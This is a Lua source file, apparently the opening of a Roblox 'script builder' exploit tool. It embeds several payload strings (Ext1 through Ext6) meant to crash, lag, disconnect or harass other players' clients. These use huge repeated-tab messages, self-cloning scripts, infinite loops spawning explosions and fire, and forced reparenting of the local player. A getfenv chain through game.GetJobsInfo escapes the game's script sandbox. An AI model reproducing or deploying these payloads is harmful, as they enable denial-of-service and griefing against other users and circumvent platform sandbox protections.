local Name = "uyjulian no sukuriputobirudasukuriputo" 
local RobloxWebsite = "rbxhttp://"
--local RobloxAsset = "rbxassetid://%u"
local LocalPlayer
local CommandGUI
local Probe
local Configuration = {}
local Ext1 = [[local function e()local a=game:service"Players".LocalPlayer;local o=workspace.CurrentCamera;a.CameraMode=Enum.CameraMode.Classic;wait()a.CameraMode=Enum.CameraMode.LockFirstPerson;local a=coroutine.wrap
a(function()for n=1,10 do
wait()a(function()for a=1,15 do
wait()for a=1,1750 do
Instance.new("Message",o).Text=string.rep("\t ",1e9)e()end
end
end)()end
end)()end
e()]]
local Ext2 = [[clone=script.Parent
script.Parent=nil
LocalPlayer=game:service"Players".LocalPlayer
while wait()do
if workspace:FindFirstChild(string.format("Disconnect : %s",LocalPlayer.Name))then
LocalPlayer.Parent=nil
wait()LocalPlayer.Parent=game:service"Players"end
end]]
local Ext4 = [[local e=game:service'Players'.LocalPlayer
e.Parent=nil
wait()
e.Parent=game:service'Players']]
local Ext5 = [[Delay(0,function()
while wait()do
local e=Instance.new('Message',game:service'PlayerGui')
e.Text=string.rep("\t ",1e9)
for e=1,100 do
script:Clone().Parent=script.Parent
end
end
end)]]
local Ext6 = [[wait()
script.Parent = game:service'TeleportService'
CC = workspace.CurrentCamera
RS = game:service("RunService")
PG = game.Players.LocalPlayer.PlayerGui
C = game.Players.LocalPlayer.Character
function Lag()
coroutine.resume(coroutine.create(function()
while wait() do
M = Instance.new("Message",CC)
M.Text = tick()*math.floor(5%4*21)
H = Instance.new("Hint",CC)
H.Text = 'Get out from this place!'
SG=Instance.new("ScreenGui",PG)
FR=Instance.new("Frame",SG)
FR.Size = UDim2.new(500,500,500,500)
while wait() do
FR.BackgroundColor3 = Color3.new(math.random(0,255),math.random)
end
P=Instance.new("Part",CC)
E=Instance.new("Explosion",P)
E.BlastRadius=math.huge
E.Position=P.Position
F=Instance.new("Fire",P)
S=Instance.new("Smoke",P)
P.CFrame = CC.Focus
P.Anchored = true
P.CanCollide = false
P.AncestryChanged:connect(function()Lag()end)
for _,v in pairs(C:GetChildren()) do pcall(function()v.Anchored=true end) end
end 
end)) 
end
RS.Stepped:connect(function()for i=1,10 do Lag()Lag()Lag()end end)]]
local PlayersService
local CharacterName
local getfenv = getfenv
local noSand = getfenv()
local env = getfenv(getfenv(getfenv(getfenv(getfenv(getfenv(game.GetJobsInfo).setfenv).xpcall).setfenv).xpcall).setfenv)

-- externals --
local Instance = env.Instance
local Color3 = env.Color3
local Vector3 = env.Vector3
local Vector2 = env.Vector2
local BrickColor = env.BrickColor
local UDim2 = env.UDim2
local CFrame = env.CFrame
local Rect = env.Rect
local wait = env.wait
local script = env.script
local game = env.game
local workspace = env.workspace
local ypcall = env.ypcall
local Spawn = env.Spawn
local Enum = env.Enum
local tick = env.tick
local pairs = env.pairs
local math = env.math
local pcall = env.pcall
local table = env.table
local string = env.string
local ipairs = env.ipairs
local tonumber = env.tonumber
local tostring = env.tostring
local loadstring = env.loadstring
local unpack = env.unpack
local type = env.type
local error = env.error
local newScript = noSand.newScript
local NS = noSand.NS
local newLocalScript = noSand.newLocalScript
local NLS = noSand.NLS
-- externals end --

local Colors = {
	["Red"] =           Color3.new(255/255,   0/255,   0/255);
	["Light red"] =     Color3.new(238/255, 196/255, 182/255);
	["PinkRed"] =       Color3.new(255/255,   0/255, 127/255);
	["Camo"] =          Color3.new( 58/255, 125/255,  21/255);
	["Turquoise"] =     Color3.new(121/255, 181/255, 181/255);
	["Orange"] =        Color3.new(255/255, 127/255,   0/255);
	["Yellow"] =        Color3.new(255/255, 255/255,   0/255);
	["Green"] =         Color3.new(  0/255, 255/255,   0/255);
	["Blue"] =          Color3.new(  0/255,   0/255, 255/255);
	["Brown"] =         Color3.new(143/255,  76/255,  42/255);
	["Lemon metalic"] = Color3.new(130/255, 138/255,  93/255);
	["LightBlue"] =     Color3.new(  0/255, 255/255, 255/255);
	["Pink"] =          Color3.new(255/255,   0/255, 255/255);
	["Magenta"] =       Color3.new(138/255,   0/255, 138/255);
	["Cyan"] =          Color3.new(  0/255, 153/255, 255/255);
	["White"] =         Color3.new(255/255, 255/255, 255/255);
	["Grey"] =          Color3.new(127/255, 127/255, 127/255);
	["Black"] =         Color3.new(  0/255,   0/255,   0/255);
}

local Nils = {}

local CreateLocalScript = false

